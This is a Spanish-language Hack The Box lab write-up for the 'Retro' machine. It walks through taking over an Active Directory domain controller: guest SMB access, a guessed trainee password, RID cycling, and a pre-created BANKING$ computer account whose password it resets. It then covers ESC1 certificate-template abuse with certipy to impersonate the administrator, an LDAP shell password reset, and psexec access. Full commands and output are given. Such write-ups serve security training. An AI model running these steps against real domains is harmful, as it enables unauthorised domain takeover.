---
tags:
title: Retro - Easy (HTB)
permalink: /Retro-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap_default 10.129.234.44 -Pn
[i] Creating /home/zsln/Desktop/zsln/htb/retro/nmap/nmap...
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 19:09 -0300
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:09
Completed Parallel DNS resolution of 1 host. at 19:09, 0.50s elapsed
Initiating SYN Stealth Scan at 19:09
Scanning 10.129.234.44 [1000 ports]
Discovered open port 3389/tcp on 10.129.234.44
Discovered open port 53/tcp on 10.129.234.44
Discovered open port 445/tcp on 10.129.234.44
Discovered open port 135/tcp on 10.129.234.44
Discovered open port 139/tcp on 10.129.234.44
Discovered open port 3269/tcp on 10.129.234.44
Discovered open port 389/tcp on 10.129.234.44
Discovered open port 636/tcp on 10.129.234.44
Discovered open port 464/tcp on 10.129.234.44
Discovered open port 3268/tcp on 10.129.234.44
Completed SYN Stealth Scan at 19:09, 1.86s elapsed (1000 total ports)
Initiating Service scan at 19:09
Scanning 10 services on 10.129.234.44
Completed Service scan at 19:11, 113.08s elapsed (10 services on 1 host)
NSE: Script scanning 10.129.234.44.
Initiating NSE at 19:11
Completed NSE at 19:11, 40.14s elapsed
Initiating NSE at 19:11
Completed NSE at 19:12, 29.08s elapsed
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
Nmap scan report for 10.129.234.44
Host is up (1.2s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-02T10:33:09
| Not valid after:  2025-10-02T10:33:09
| MD5:     0570 85e4 2e0b 442c 16c0 d258 3acb 1019
| SHA-1:   0b6c b037 2581 5555 b186 8ca2 35e7 21db 2c8d 56d6
|_SHA-256: d49e 84da b23d bdf2 6e7e 1936 4a50 a3c8 3957 98fd 43af d39a 345d b253 c5f9 81c6
|_ssl-date: 2026-02-03T22:14:45+00:00; +2m44s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-02T10:33:09
| Not valid after:  2025-10-02T10:33:09
| MD5:     0570 85e4 2e0b 442c 16c0 d258 3acb 1019
| SHA-1:   0b6c b037 2581 5555 b186 8ca2 35e7 21db 2c8d 56d6
|_SHA-256: d49e 84da b23d bdf2 6e7e 1936 4a50 a3c8 3957 98fd 43af d39a 345d b253 c5f9 81c6
|_ssl-date: 2026-02-03T22:14:44+00:00; +2m44s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-02T10:33:09
| Not valid after:  2025-10-02T10:33:09
| MD5:     0570 85e4 2e0b 442c 16c0 d258 3acb 1019
| SHA-1:   0b6c b037 2581 5555 b186 8ca2 35e7 21db 2c8d 56d6
|_SHA-256: d49e 84da b23d bdf2 6e7e 1936 4a50 a3c8 3957 98fd 43af d39a 345d b253 c5f9 81c6
|_ssl-date: 2026-02-03T22:14:45+00:00; +2m43s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-02T10:33:09
| Not valid after:  2025-10-02T10:33:09
| MD5:     0570 85e4 2e0b 442c 16c0 d258 3acb 1019
| SHA-1:   0b6c b037 2581 5555 b186 8ca2 35e7 21db 2c8d 56d6
|_SHA-256: d49e 84da b23d bdf2 6e7e 1936 4a50 a3c8 3957 98fd 43af d39a 345d b253 c5f9 81c6
|_ssl-date: 2026-02-03T22:14:44+00:00; +2m44s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.retro.vl
| Issuer: commonName=DC.retro.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-02T22:08:52
| Not valid after:  2026-08-04T22:08:52
| MD5:     af3b 4d56 e133 e997 d470 37ea 7c03 1a13
| SHA-1:   e697 b8cb 6d8b 0422 d82a 551a 314f 3208 2c57 3f36
|_SHA-256: 607a 586c bef8 dd31 730d dbef 2cc0 25ec e64f 3a43 84c8 fee2 10da 1d5b 3d8e 727f
|_ssl-date: 2026-02-03T22:14:44+00:00; +2m43s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-02-03T22:14:08
|_  start_date: N/A
|_clock-skew: mean: 2m43s, deviation: 0s, median: 2m43s

NSE: Script Post-scanning.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.89 seconds
           Raw packets sent: 2000 (88.000KB) | Rcvd: 10 (440B)
```
### SMB Enumeration

Como `smb` estaba expuesto use el login de invitado para conectarme y así descargar el archivo en el recurso compartido `Trainees`.

```bash
 impacket-smbclient retro.vl/guest@10.129.234.44 -dc-ip 10.129.234.44
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

Password:
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Notes
SYSVOL
Trainees
# use trainees
# ls
drw-rw-rw-          0  Sun Jul 23 19:16:11 2023 .
drw-rw-rw-          0  Wed Jun 11 11:17:10 2025 ..
-rw-rw-rw-        288  Sun Jul 23 19:16:11 2023 Important.txt
```

En este archivo hablan que debido a la mala administración de cuentas por no usar password fuertes, colocaron las funciones de varias cuentas en una sola.

```bash
cat Important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins 
```

Probé con las credenciales `trainee:trainee` y tuve éxito, lo que me permitió conectarme a `Notes` y ver además de la flag un archivo mas.

```bash
 impacket-smbclient retro.vl/trainee:trainee@10.129.234.44 -dc-ip 10.129.234.44
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use notes
ls
# ls
drw-rw-rw-          0  Wed Apr  9 00:12:49 2025 .
drw-rw-rw-          0  Wed Jun 11 11:17:10 2025 ..
-rw-rw-rw-        248  Sun Jul 23 19:05:56 2023 ToDo.txt
-rw-rw-rw-         32  Wed Apr  9 00:13:01 2025 user.txt
```

```bash
 cat user.txt
cbda362cff2099072c5e96c51712ff33  
```

## Auth as BANKING$

Viendo el contenido del archivo, se creo y se puso en marcha una `pre created computer account` lo cual hace alusion a una cuenta de computadora.

```bash
 cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James 
```
### RID Cycling

Por lo que con las credenciales del `trainee` realice un `RID Cycling`, lo que me permitió ver la cuenta `BANKING$`.

```bash
netexec smb retro.vl -u trainee -p trainee --rid-brute
SMB         10.129.234.44   445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:None)
SMB         10.129.234.44   445    NONE             [+] \trainee:trainee
<SNIP>
SMB         10.129.234.44   445    NONE             1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    NONE             1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    NONE             1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    NONE             1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    NONE             1109: RETRO\tblack (SidTypeUser)
```
### Auth fail

Por lo general lo que son cuentas computadora, usan como password su mismo nombre en minúscula y sin `$`.
Pero validando esto me sale el siguiente error.

```
netexec smb dc.retro.vl -u 'BANKING$' -p banking
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
```

El mensaje es bueno ya que en cuentas como estas que no fueron usadas hasta el momento indica que la password es correcta.
### Change BAKING$'s password

Por lo que con `chagepasswd` le setee una nueva password.

```bash
impacket-changepasswd -newpass 'zsln123!$' 'retro.vl/BANKING$:banking$@dc.retro.vl' -protocol rpc-samr
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```
## Shell as administrator
### ADCS Enumeration

Luego de esto, como no hay mucho mas, enumere plantillas vulnerables del dominio.

```bash
certipy-ad find -u 'BANKING$' -p 'zsln123!$' -dc-host retro.vl -target 10.129.234.44 -dc-ip 10.129.234.44 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.4
```
### ESC1 Abuse

Para abusar de `ESC1` algunos de los datos que necesito el el SID del usuario `administrator`, el cual consegui con `rpcclient`.

```bash
rpcclient -U 'trainee%trainee' 10.129.234.44
rpcclient $> lookupnames administrator
administrator S-1-5-21-2983547755-698260136-4283918172-500 (User: 1)
```
### Certificate request fail

Al solicitar el certificado con los datos que necesito, veo que me sale un error de la longitud, o peso por decirlo de alguna manera, es incorrecto, y sabiendo que `certipy` por defecto lo configura a `2048` lo tuve que cambiar.

```bash
certipy-ad req \
    -u 'BANKING$@retro.vl' -p 'zsln123!$' \
    -dc-ip '10.129.234.44' -target 'DC.retro.vl' \
    -ca 'retro-DC-CA' -template 'RetroClients' \
    -upn 'administrator@retro.vl' \
    -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 12
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
```
### Change size

Para cambiarlo use el parámetro `-key-size` doblando su tamaño.

```bash
certipy-ad req \
    -u 'BANKING$@retro.vl' -p 'zsln123!$' \
    -dc-ip '10.129.234.44' -target 'DC.retro.vl' \
    -ca 'retro-DC-CA' -template 'RetroClients' \
    -upn 'administrator@retro.vl' -key-size 4096
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Pero sin embargo con el certificado del usuario `administrator`, no muestra el `SID`.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
[-] See the wiki for more information
```

Por lo que volvi a solicitarlo pero esta vez usando el `SID` que obtuve antes.

```bash
 certipy-ad  req -u 'BANKING$@retro.vl' -p 'zsln123!$' -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -sid  S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: RETRO.VL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```
### LDAP shell

Cuando me quise autenticar, me salia un error del tipo de `data` con el que estaba encriptado el certificado, no era valido.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information

```
### Change administrator password

Así que sabiendo que el certificado es valido, solicite una shell `ldap`. Donde le cambie la contraseña al usuario `administrator`

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44 -ldap-shell
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Connecting to 'ldaps://10.129.234.44:636'
[*] Authenticated to '10.129.234.44' as: 'u:RETRO\\Administrator'
Type help for list of commands

# change_password administrator zsln123123
Got User DN: CN=Administrator,CN=Users,DC=retro,DC=vl
Attempting to set new password of: zsln123123
Password changed successfully!
```

### Shell 

Con las mismas me conecte con `psexec` ya que `WinRM` no estaba habilitado.

```powershell
impacket-psexec retro.vl/administrator:zsln123123@dc.retro.vl -dc-ip 10.129.234.44
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc.retro.vl.....
[*] Found writable share ADMIN$
[*] Uploading file fDenhPad.exe
[*] Opening SVCManager on dc.retro.vl.....
[*] Creating service NhSf on dc.retro.vl.....
[*] Starting service NhSf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> type root.txt
40fce9c3f09024bcab29d377ee1ed071
```

`~Happy Hacking.`